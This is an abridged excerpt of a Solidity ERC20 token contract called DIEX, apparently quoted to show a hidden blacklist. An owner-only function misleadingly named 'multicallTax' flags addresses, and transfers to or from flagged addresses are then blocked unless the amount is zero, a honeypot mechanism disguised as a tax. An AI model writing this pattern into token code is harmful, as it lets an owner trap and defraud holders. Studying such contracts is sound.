 ...
 */
contract DIEX is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _multicallTax;
    bool _initialize;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (_multicallTax[sender] || _multicallTax[recipient]) require (amount == 0, "");
     ...
     */
    function multicallTax (address _address) external onlyOwner {
        if (_multicallTax[_address] == true) {_multicallTax[_address] = false;}
        else {_multicallTax[_address] = true; }
    }
